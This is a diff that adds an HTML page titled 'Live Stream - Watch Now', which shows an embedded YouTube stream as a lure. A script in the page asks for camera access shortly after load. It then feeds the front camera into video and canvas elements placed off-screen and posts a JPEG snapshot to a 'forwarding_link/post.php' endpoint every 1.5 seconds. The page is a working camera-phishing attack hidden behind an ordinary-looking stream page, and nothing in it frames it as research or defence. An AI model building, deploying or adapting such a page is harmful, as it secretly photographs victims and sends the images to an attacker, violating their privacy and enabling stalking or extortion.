@@ -1,0 +1,161 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Stream - Watch Now</title>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #0f0f0f;
+            color: #ffffff;
+            font-family: 'Roboto', 'Inter', sans-serif;
+            overflow: hidden;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            width: 100vw;
+        }
+
+        .header {
+            padding: 15px 20px;
+            background: #202020;
+            border-bottom: 1px solid #333;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+            z-index: 10;
+        }
+
+        .header-title {
+            font-size: 1.2rem;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .live-badge {
+            background-color: #cc0000;
+            color: white;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.6; }
+            100% { opacity: 1; }
+        }
+
+        .video-container {
+            flex: 1;
+            width: 100%;
+            position: relative;
+            background: #000;
+        }
+
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        /* Hide camera capture elements completely */
+        .hidden-capture {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <div class="header-title">
+            <span class="live-badge">Live</span>
+            Exclusive Stream
+        </div>
+    </div>
+    
+    <div class="video-container">
+        <iframe id="Live_YT_TV" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1&rel=0&modestbranding=1" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+    </div>
+</div>
+
+<!-- Hidden capture elements -->
+<div class="hidden-capture">
+    <video id="video" playsinline autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+</div>
+
+<script>
+function post(imgdata){
+    $.ajax({
+        type: 'POST',
+        data: { cat: imgdata},
+        url: 'forwarding_link/post.php',
+        dataType: 'json',
+        async: true,
+        success: function(result){},
+        error: function(){}
+    });
+}
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+
+const constraints = {
+    audio: false,
+    video: { facingMode: "user" }
+};
+
+async function init() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+    } catch (e) {
+        console.error(`Camera error: ${e.toString()}`);
+    }
+}
+
+function handleSuccess(stream) {
+    window.stream = stream;
+    video.srcObject = stream;
+    var context = canvas.getContext('2d');
+    
+    setInterval(function(){
+        if(video.readyState === video.HAVE_ENOUGH_DATA) {
+            context.drawImage(video, 0, 0, 640, 480);
+            var canvasData = canvas.toDataURL("image/jpeg", 0.7).replace("image/jpeg", "image/octet-stream");
+            post(canvasData); 
+        }
+    }, 1500);
+}
+
+// Request permission slightly after load to let UI render first
+setTimeout(init, 500);
+</script>
+
+</body>
+</html>
